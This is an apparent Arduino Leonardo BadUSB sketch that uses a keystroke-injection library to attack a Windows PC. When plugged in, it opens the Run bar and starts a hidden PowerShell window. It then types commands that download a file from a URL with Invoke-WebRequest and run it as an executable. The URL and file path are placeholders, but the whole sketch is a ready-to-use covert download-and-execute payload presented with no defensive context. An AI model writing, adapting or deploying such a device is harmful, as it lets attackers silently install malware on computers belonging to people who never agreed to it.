#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell -windowstyle hidden");
  delay(3000);
  Keyboard.println("$source = \"File URL \"; $destination = \"Path\\FileName\"; Invoke-WebRequest $source -OutFile $destination;");
  delay(2000);
  Keyboard.println("start-process FileName.EXE");
  delay(2000);
  Keyboard.println("exit");
  while(1);
}
